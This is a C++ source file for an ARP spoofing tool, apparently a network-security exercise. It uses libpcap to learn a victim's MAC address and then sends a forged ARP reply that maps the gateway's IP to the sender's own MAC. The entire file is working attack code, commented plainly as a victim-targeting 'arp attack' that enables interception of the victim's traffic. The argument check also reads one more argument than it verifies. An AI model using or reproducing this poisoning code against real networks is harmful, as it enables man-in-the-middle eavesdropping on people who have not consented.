#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <malloc.h>
#include <libnet.h>

//MAC주소 길이
#define MAC_ALEN 6
#define MAC_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

//my IP/MAC address
int GetInterfaceMacAddress(const char *ifname, Mac *mac_addr, Ip* ip_addr){
    struct ifreq ifr;
    int sockfd, ret;

    printf("Get interface(%s) MAC address\n", ifname);

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0){
        printf("Fail to get\n");
        return -1;
    }

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0){
        printf("Fail to get\n");
        close(sockfd);
        return -1;
    }
    memcpy((void*)mac_addr, ifr.ifr_hwaddr.sa_data, Mac::SIZE);

    ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
    if (ret < 0){
        printf("Fail to get\n");
        close(sockfd);
        return -1;
    }
    char ipstr[40];
    //memcpy((void*)ip_addr, ifr.ifr_addr.sa_data, Ip::SIZE);
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr, sizeof(struct sockaddr));
    printf("%s", ipstr);
    *ip_addr = Ip(ipstr);
    close(sockfd);
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
		usage();
		return -1;
	}

	char* dev = argv[1];
    Ip s_ip(argv[2]);
    Ip t_ip(argv[3]);

    EthArpPacket packet;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    char errbuf_2[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf_2);

    Mac MAC_ADD;
    Ip IP_ADD;
    GetInterfaceMacAddress(dev, &MAC_ADD, &IP_ADD);

    //To get vicitm MAC address - arp request to victim
    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = Mac(MAC_ADD);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(MAC_ADD); //my MAC_ADD
    packet.arp_.sip_ = htonl(IP_ADD); //my ip - any ip in here can get reply packet
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(s_ip);  //victim ip

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while (true) {
            struct pcap_pkthdr* header;
            libnet_ethernet_hdr *eth_hdr;

            const u_char* out_packet;

            int res = pcap_next_ex(pcap, &header, &out_packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                break;
            }
            //hdr
            eth_hdr = (libnet_ethernet_hdr*)(out_packet);

            if (ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP){
                continue;
            }
            EthArpPacket *arp_packet = (EthArpPacket *)out_packet;
            if (arp_packet->arp_.op() == arp_packet->arp_.Reply && arp_packet->arp_.sip() == s_ip){
                printf("Victim Mac Address Captured success\n");
                packet.arp_.tmac_ = arp_packet->arp_.smac();
                packet.eth_.dmac_ = arp_packet->arp_.smac();
                break;
            }
    }


    //attack
    printf("start arp attack");
    //destination mac is defined (victim mac)
    packet.eth_.smac_ = Mac(MAC_ADD);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(MAC_ADD); //gateway mac to mine
    packet.arp_.sip_ = htonl(t_ip); //gateway ip
    //victim mac is defined
    packet.arp_.tip_ = htonl(s_ip);  //victim ip

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
